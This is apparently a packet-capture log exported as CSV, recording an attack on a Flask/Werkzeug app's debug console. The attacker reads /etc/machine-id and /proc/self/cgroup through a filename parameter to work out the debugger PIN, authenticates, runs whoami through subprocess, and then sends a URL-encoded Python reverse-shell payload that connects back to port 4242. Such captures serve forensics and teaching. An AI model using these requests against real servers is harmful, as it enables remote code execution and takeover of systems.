"No.","Time","Source","Destination","Protocol","Length","Info","src_mac"
"3457","2023-10-21 13:49:30.650218165","192.168.1.227","192.168.1.183","TCP","74","46042  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341606723 TSecr=0 WS=128","VMware_65:77:ad"
"3459","2023-10-21 13:49:30.650817984","192.168.1.227","192.168.1.183","TCP","66","46042  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341606724 TSecr=1741586935","VMware_65:77:ad"
"3460","2023-10-21 13:49:30.651053765","192.168.1.227","192.168.1.183","HTTP","527","GET /api?filename=/etc/machine-id HTTP/1.1 ","VMware_65:77:ad"
"3463","2023-10-21 13:49:30.652846789","192.168.1.227","192.168.1.183","TCP","66","46042  >  5000 [ACK] Seq=462 Ack=175 Win=64128 Len=0 TSval=2341606726 TSecr=1741586937","VMware_65:77:ad"
"3466","2023-10-21 13:49:30.653035941","192.168.1.227","192.168.1.183","TCP","66","46042  >  5000 [ACK] Seq=462 Ack=275 Win=64128 Len=0 TSval=2341606726 TSecr=1741586937","VMware_65:77:ad"
"3467","2023-10-21 13:49:30.653643044","192.168.1.227","192.168.1.183","TCP","66","46042  >  5000 [FIN, ACK] Seq=462 Ack=276 Win=64128 Len=0 TSval=2341606726 TSecr=1741586937","VMware_65:77:ad"
"3512","2023-10-21 13:49:32.495577156","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=2201 Ack=2201 Win=501 Len=110 TSval=2919259263 TSecr=1841345847 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"3515","2023-10-21 13:49:32.501283198","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=2311 Ack=2311 Win=501 Len=0 TSval=2919259269 TSecr=1841350866","VMware_65:77:ad"
"3595","2023-10-21 13:49:37.510114545","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=2311 Ack=2311 Win=501 Len=110 TSval=2919264278 TSecr=1841350866 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"3598","2023-10-21 13:49:37.521373225","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=2421 Ack=2421 Win=501 Len=0 TSval=2919264289 TSecr=1841355886","VMware_65:77:ad"
"3645","2023-10-21 13:49:40.667843020","192.168.1.227","192.168.1.183","TCP","74","43138  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341616740 TSecr=0 WS=128","VMware_65:77:ad"
"3647","2023-10-21 13:49:40.668517021","192.168.1.227","192.168.1.183","TCP","66","43138  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341616741 TSecr=1741596952","VMware_65:77:ad"
"3648","2023-10-21 13:49:40.668751911","192.168.1.227","192.168.1.183","HTTP","529","GET /api?filename=/proc/self/cgroup HTTP/1.1 ","VMware_65:77:ad"
"3652","2023-10-21 13:49:40.671251535","192.168.1.227","192.168.1.183","TCP","66","43138  >  5000 [ACK] Seq=464 Ack=175 Win=64128 Len=0 TSval=2341616744 TSecr=1741596955","VMware_65:77:ad"
"3653","2023-10-21 13:49:40.671682671","192.168.1.227","192.168.1.183","TCP","66","43138  >  5000 [FIN, ACK] Seq=464 Ack=290 Win=64128 Len=0 TSval=2341616744 TSecr=1741596955","VMware_65:77:ad"
"3711","2023-10-21 13:49:42.525862947","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=2421 Ack=2421 Win=501 Len=110 TSval=2919269293 TSecr=1841355886 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"3714","2023-10-21 13:49:42.535635375","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=2531 Ack=2531 Win=501 Len=0 TSval=2919269303 TSecr=1841360900","VMware_65:77:ad"
"3807","2023-10-21 13:49:47.542305171","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=2531 Ack=2531 Win=501 Len=110 TSval=2919274310 TSecr=1841360900 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"3810","2023-10-21 13:49:47.553672185","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=2641 Ack=2641 Win=501 Len=0 TSval=2919274321 TSecr=1841365918","VMware_65:77:ad"
"3835","2023-10-21 13:49:49.365015358","192.168.1.227","192.168.1.183","TCP","74","37082  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341625436 TSecr=0 WS=128","VMware_65:77:ad"
"3837","2023-10-21 13:49:49.365616536","192.168.1.227","192.168.1.183","TCP","66","37082  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341625438 TSecr=1741605649","VMware_65:77:ad"
"3838","2023-10-21 13:49:49.366027554","192.168.1.227","192.168.1.183","HTTP","558","GET /console HTTP/1.1 ","VMware_65:77:ad"
"3842","2023-10-21 13:49:49.368970874","192.168.1.227","192.168.1.183","TCP","66","37082  >  5000 [ACK] Seq=493 Ack=176 Win=64128 Len=0 TSval=2341625441 TSecr=1741605653","VMware_65:77:ad"
"3843","2023-10-21 13:49:49.369031600","192.168.1.227","192.168.1.183","TCP","66","37082  >  5000 [ACK] Seq=493 Ack=1624 Win=64128 Len=0 TSval=2341625442 TSecr=1741605653","VMware_65:77:ad"
"3846","2023-10-21 13:49:49.369274104","192.168.1.227","192.168.1.183","TCP","66","37082  >  5000 [ACK] Seq=493 Ack=1739 Win=64128 Len=0 TSval=2341625442 TSecr=1741605653","VMware_65:77:ad"
"3847","2023-10-21 13:49:49.370202923","192.168.1.227","192.168.1.183","TCP","66","37082  >  5000 [FIN, ACK] Seq=493 Ack=1740 Win=64128 Len=0 TSval=2341625443 TSecr=1741605653","VMware_65:77:ad"
"3850","2023-10-21 13:49:50.147685285","192.168.1.227","192.168.1.183","TCP","74","37086  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341626220 TSecr=0 WS=128","VMware_65:77:ad"
"3852","2023-10-21 13:49:50.148068339","192.168.1.227","192.168.1.183","TCP","74","37088  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341626220 TSecr=0 WS=128","VMware_65:77:ad"
"3854","2023-10-21 13:49:50.148468846","192.168.1.227","192.168.1.183","TCP","66","37086  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341626221 TSecr=1741606432","VMware_65:77:ad"
"3855","2023-10-21 13:49:50.148468936","192.168.1.227","192.168.1.183","HTTP","497","GET /console?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1 ","VMware_65:77:ad"
"3857","2023-10-21 13:49:50.148468966","192.168.1.227","192.168.1.183","TCP","66","37088  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341626221 TSecr=1741606432","VMware_65:77:ad"
"3858","2023-10-21 13:49:50.148701772","192.168.1.227","192.168.1.183","HTTP","484","GET /console?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1 ","VMware_65:77:ad"
"3861","2023-10-21 13:49:50.153765390","192.168.1.227","192.168.1.183","TCP","66","37086  >  5000 [ACK] Seq=432 Ack=305 Win=64128 Len=0 TSval=2341626226 TSecr=1741606437","VMware_65:77:ad"
"3864","2023-10-21 13:49:50.154151941","192.168.1.227","192.168.1.183","TCP","66","37088  >  5000 [ACK] Seq=419 Ack=316 Win=64128 Len=0 TSval=2341626227 TSecr=1741606438","VMware_65:77:ad"
"3869","2023-10-21 13:49:50.154651287","192.168.1.227","192.168.1.183","TCP","66","37086  >  5000 [ACK] Seq=432 Ack=6383 Win=60672 Len=0 TSval=2341626227 TSecr=1741606438","VMware_65:77:ad"
"3870","2023-10-21 13:49:50.154651387","192.168.1.227","192.168.1.183","TCP","66","37088  >  5000 [ACK] Seq=419 Ack=7556 Win=60672 Len=0 TSval=2341626227 TSecr=1741606438","VMware_65:77:ad"
"3871","2023-10-21 13:49:50.154712294","192.168.1.227","192.168.1.183","TCP","66","37088  >  5000 [ACK] Seq=419 Ack=8508 Win=59776 Len=0 TSval=2341626227 TSecr=1741606438","VMware_65:77:ad"
"3872","2023-10-21 13:49:50.154857712","192.168.1.227","192.168.1.183","TCP","66","37086  >  5000 [FIN, ACK] Seq=432 Ack=6384 Win=64128 Len=0 TSval=2341626227 TSecr=1741606438","VMware_65:77:ad"
"3874","2023-10-21 13:49:50.155135665","192.168.1.227","192.168.1.183","TCP","66","37088  >  5000 [ACK] Seq=419 Ack=10838 Win=57472 Len=0 TSval=2341626227 TSecr=1741606439","VMware_65:77:ad"
"3875","2023-10-21 13:49:50.156129709","192.168.1.227","192.168.1.183","TCP","66","37088  >  5000 [FIN, ACK] Seq=419 Ack=10838 Win=64128 Len=0 TSval=2341626229 TSecr=1741606439","VMware_65:77:ad"
"3887","2023-10-21 13:49:50.260224055","192.168.1.227","192.168.1.183","TCP","74","37106  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341626332 TSecr=0 WS=128","VMware_65:77:ad"
"3889","2023-10-21 13:49:50.260586239","192.168.1.227","192.168.1.183","TCP","66","37106  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341626333 TSecr=1741606544","VMware_65:77:ad"
"3890","2023-10-21 13:49:50.260794458","192.168.1.227","192.168.1.183","HTTP","493","GET /console?__debugger__=yes&cmd=printpin&s=CvokZoT2hAwJh0pLGKhC HTTP/1.1 ","VMware_65:77:ad"
"3894","2023-10-21 13:49:50.263342886","192.168.1.227","192.168.1.183","TCP","66","37106  >  5000 [ACK] Seq=428 Ack=174 Win=64128 Len=0 TSval=2341626336 TSecr=1741606547","VMware_65:77:ad"
"3895","2023-10-21 13:49:50.263904691","192.168.1.227","192.168.1.183","TCP","66","37106  >  5000 [FIN, ACK] Seq=428 Ack=175 Win=64128 Len=0 TSval=2341626336 TSecr=1741606547","VMware_65:77:ad"
"3897","2023-10-21 13:49:50.280808253","192.168.1.227","162.159.200.123","NTP","90","NTP Version 4, client","VMware_65:77:ad"
"3917","2023-10-21 13:49:52.558673537","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=2641 Ack=2641 Win=501 Len=110 TSval=2919279326 TSecr=1841365918 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"3920","2023-10-21 13:49:52.568314903","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=2751 Ack=2751 Win=501 Len=0 TSval=2919279336 TSecr=1841370933","VMware_65:77:ad"
"3952","2023-10-21 13:49:54.515275893","192.168.1.227","192.168.1.183","TCP","74","37112  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341630587 TSecr=0 WS=128","VMware_65:77:ad"
"3954","2023-10-21 13:49:54.515655700","192.168.1.227","192.168.1.183","TCP","66","37112  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341630588 TSecr=1741610799","VMware_65:77:ad"
"3955","2023-10-21 13:49:54.515998416","192.168.1.227","192.168.1.183","HTTP","493","GET /console?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1 ","VMware_65:77:ad"
"3959","2023-10-21 13:49:54.518081979","192.168.1.227","192.168.1.183","TCP","66","37112  >  5000 [ACK] Seq=428 Ack=293 Win=64128 Len=0 TSval=2341630591 TSecr=1741610802","VMware_65:77:ad"
"3960","2023-10-21 13:49:54.518707367","192.168.1.227","192.168.1.183","TCP","66","37112  >  5000 [FIN, ACK] Seq=428 Ack=801 Win=64128 Len=0 TSval=2341630591 TSecr=1741610802","VMware_65:77:ad"
"4018","2023-10-21 13:49:57.575187457","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=2751 Ack=2751 Win=501 Len=110 TSval=2919284343 TSecr=1841370933 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"4023","2023-10-21 13:49:57.634560453","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=2861 Ack=2861 Win=501 Len=0 TSval=2919284402 TSecr=1841375999","VMware_65:77:ad"
"4301","2023-10-21 13:50:02.639535326","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=2861 Ack=2861 Win=501 Len=110 TSval=2919289407 TSecr=1841375999 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"4308","2023-10-21 13:50:02.688473673","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=2971 Ack=2971 Win=501 Len=0 TSval=2919289456 TSecr=1841381020","VMware_65:77:ad"
"4460","2023-10-21 13:50:05.838492509","192.168.1.227","192.168.1.183","TCP","74","33196  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341641911 TSecr=0 WS=128","VMware_65:77:ad"
"4462","2023-10-21 13:50:05.838868389","192.168.1.227","192.168.1.183","TCP","66","33196  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341641911 TSecr=1741622123","VMware_65:77:ad"
"4463","2023-10-21 13:50:05.839170618","192.168.1.227","192.168.1.183","HTTP","456","GET /console?__debugger__=yes&cmd=pinauth&pin=880-163-023&s=CvokZoT2hAwJh0pLGKhC HTTP/1.1 ","VMware_65:77:ad"
"4467","2023-10-21 13:50:05.847987418","192.168.1.227","192.168.1.183","TCP","66","33196  >  5000 [ACK] Seq=391 Ack=264 Win=64128 Len=0 TSval=2341641920 TSecr=1741622132","VMware_65:77:ad"
"4468","2023-10-21 13:50:05.850488055","192.168.1.227","192.168.1.183","TCP","66","33196  >  5000 [FIN, ACK] Seq=391 Ack=299 Win=64128 Len=0 TSval=2341641923 TSecr=1741622132","VMware_65:77:ad"
"4506","2023-10-21 13:50:07.694486850","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=2971 Ack=2971 Win=501 Len=110 TSval=2919294461 TSecr=1841381020 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"4509","2023-10-21 13:50:07.699179230","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=3081 Ack=3081 Win=501 Len=0 TSval=2919294467 TSecr=1841386063","VMware_65:77:ad"
"4574","2023-10-21 13:50:10.332438917","192.168.1.227","192.168.1.183","TCP","74","45900  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341646405 TSecr=0 WS=128","VMware_65:77:ad"
"4576","2023-10-21 13:50:10.332720717","192.168.1.227","192.168.1.183","TCP","66","45900  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341646405 TSecr=1741626617","VMware_65:77:ad"
"4577","2023-10-21 13:50:10.332896313","192.168.1.227","192.168.1.183","HTTP","518","GET /console?&__debugger__=yes&cmd=import%20subprocess&frm=0&s=CvokZoT2hAwJh0pLGKhC HTTP/1.1 ","VMware_65:77:ad"
"4581","2023-10-21 13:50:10.339489301","192.168.1.227","192.168.1.183","TCP","66","45900  >  5000 [ACK] Seq=453 Ack=174 Win=64128 Len=0 TSval=2341646412 TSecr=1741626623","VMware_65:77:ad"
"4582","2023-10-21 13:50:10.339790455","192.168.1.227","192.168.1.183","TCP","66","45900  >  5000 [FIN, ACK] Seq=453 Ack=197 Win=64128 Len=0 TSval=2341646412 TSecr=1741626623","VMware_65:77:ad"
"4616","2023-10-21 13:50:12.703180928","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=3081 Ack=3081 Win=501 Len=110 TSval=2919299470 TSecr=1841386063 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"4618","2023-10-21 13:50:12.705489038","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=3191 Ack=3191 Win=501 Len=0 TSval=2919299473 TSecr=1841391069","VMware_65:77:ad"
"4694","2023-10-21 13:50:17.710342477","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=3191 Ack=3191 Win=501 Len=110 TSval=2919304478 TSecr=1841391069 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"4696","2023-10-21 13:50:17.713130403","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=3301 Ack=3301 Win=501 Len=0 TSval=2919304481 TSecr=1841396077","VMware_65:77:ad"
"4735","2023-10-21 13:50:20.884644705","192.168.1.227","192.168.1.183","TCP","74","32998  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341656957 TSecr=0 WS=128","VMware_65:77:ad"
"4737","2023-10-21 13:50:20.885242831","192.168.1.227","192.168.1.183","TCP","66","32998  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341656958 TSecr=1741637169","VMware_65:77:ad"
"4738","2023-10-21 13:50:20.885421723","192.168.1.227","192.168.1.183","HTTP","542","GET /console?&__debugger__=yes&cmd=subprocess.check_output(%5B%22whoami%22%5D)&frm=0&s=CvokZoT2hAwJh0pLGKhC HTTP/1.1 ","VMware_65:77:ad"
"4742","2023-10-21 13:50:20.892560568","192.168.1.227","192.168.1.183","TCP","66","32998  >  5000 [ACK] Seq=477 Ack=174 Win=64128 Len=0 TSval=2341656965 TSecr=1741637176","VMware_65:77:ad"
"4743","2023-10-21 13:50:20.892907448","192.168.1.227","192.168.1.183","TCP","66","32998  >  5000 [FIN, ACK] Seq=477 Ack=268 Win=64128 Len=0 TSval=2341656965 TSecr=1741637176","VMware_65:77:ad"
"4762","2023-10-21 13:50:22.476076409","192.168.1.227","162.159.200.123","NTP","90","NTP Version 4, client","VMware_65:77:ad"
"4769","2023-10-21 13:50:22.718889427","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=3301 Ack=3301 Win=501 Len=110 TSval=2919309486 TSecr=1841396077 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"4771","2023-10-21 13:50:22.721187291","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=3411 Ack=3411 Win=501 Len=0 TSval=2919309489 TSecr=1841401085","VMware_65:77:ad"
"4890","2023-10-21 13:50:27.727129455","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=3411 Ack=3411 Win=501 Len=110 TSval=2919314494 TSecr=1841401085 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"4892","2023-10-21 13:50:27.729592001","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=3521 Ack=3521 Win=501 Len=0 TSval=2919314497 TSecr=1841406093","VMware_65:77:ad"
"5017","2023-10-21 13:50:32.734982929","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=3521 Ack=3521 Win=501 Len=110 TSval=2919319502 TSecr=1841406093 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"5019","2023-10-21 13:50:32.738605858","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=3631 Ack=3631 Win=501 Len=0 TSval=2919319506 TSecr=1841411100","VMware_65:77:ad"
"5048","2023-10-21 13:50:33.817763593","192.168.1.227","239.255.255.250","SSDP","210","M-SEARCH * HTTP/1.1 ","VMware_65:77:ad"
"5074","2023-10-21 13:50:34.822290071","192.168.1.227","239.255.255.250","SSDP","210","M-SEARCH * HTTP/1.1 ","VMware_65:77:ad"
"5104","2023-10-21 13:50:35.822581936","192.168.1.227","239.255.255.250","SSDP","210","M-SEARCH * HTTP/1.1 ","VMware_65:77:ad"
"5127","2023-10-21 13:50:36.822578792","192.168.1.227","239.255.255.250","SSDP","210","M-SEARCH * HTTP/1.1 ","VMware_65:77:ad"
"5134","2023-10-21 13:50:37.743955247","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=3631 Ack=3631 Win=501 Len=110 TSval=2919324511 TSecr=1841411100 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"5136","2023-10-21 13:50:37.746684193","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=3741 Ack=3741 Win=501 Len=0 TSval=2919324514 TSecr=1841416110","VMware_65:77:ad"
"5140","2023-10-21 13:50:38.058869766","192.168.1.227","192.168.1.183","TCP","74","46486  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341674131 TSecr=0 WS=128","VMware_65:77:ad"
"5142","2023-10-21 13:50:38.059487900","192.168.1.227","192.168.1.183","TCP","66","46486  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341674131 TSecr=1741654343","VMware_65:77:ad"
"5143","2023-10-21 13:50:38.059671021","192.168.1.227","192.168.1.183","HTTP","733","GET /console?&__debugger__=yes&cmd=import%20socket%2Cos%2Cpty%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%22192.168.1.227%22%2C4242))%3Bos.dup2(s.fileno()%2C0)%3Bos.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)%3Bpty.spawn(%22%2Fbin%2Fsh%22)&frm=0&s=CvokZoT2hAwJh0pLGKhC HTTP/1.1 ","VMware_65:77:ad"
"5146","2023-10-21 13:50:38.067274063","192.168.1.227","192.168.1.183","TCP","74","4242  >  52536 [SYN, ACK] Seq=0 Ack=1 Win=65160 Len=0 MSS=1460 SACK_PERM=1 TSval=2341674139 TSecr=1741654350 WS=128","VMware_65:77:ad"
"5149","2023-10-21 13:50:38.084935970","192.168.1.227","192.168.1.183","TCP","66","4242  >  52536 [ACK] Seq=1 Ack=3 Win=65280 Len=0 TSval=2341674157 TSecr=1741654369","VMware_65:77:ad"
"5177","2023-10-21 13:50:40.298082011","192.168.1.227","192.168.1.183","TCP","73","4242  >  52536 [PSH, ACK] Seq=1 Ack=3 Win=65280 Len=7 TSval=2341676370 TSecr=1741654369","VMware_65:77:ad"
"5180","2023-10-21 13:50:40.299287880","192.168.1.227","192.168.1.183","TCP","66","4242  >  52536 [ACK] Seq=8 Ack=11 Win=65280 Len=0 TSval=2341676371 TSecr=1741656583","VMware_65:77:ad"
"5182","2023-10-21 13:50:40.300367913","192.168.1.227","192.168.1.183","TCP","66","4242  >  52536 [ACK] Seq=8 Ack=17 Win=65280 Len=0 TSval=2341676372 TSecr=1741656584","VMware_65:77:ad"
"5184","2023-10-21 13:50:40.300678584","192.168.1.227","192.168.1.183","TCP","66","4242  >  52536 [ACK] Seq=8 Ack=19 Win=65280 Len=0 TSval=2341676373 TSecr=1741656585","VMware_65:77:ad"
"5244","2023-10-21 13:50:42.751072902","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=3741 Ack=3741 Win=501 Len=110 TSval=2919329518 TSecr=1841416110 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"5246","2023-10-21 13:50:42.759039149","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=3851 Ack=3851 Win=501 Len=0 TSval=2919329526 TSecr=1841421121","VMware_65:77:ad"
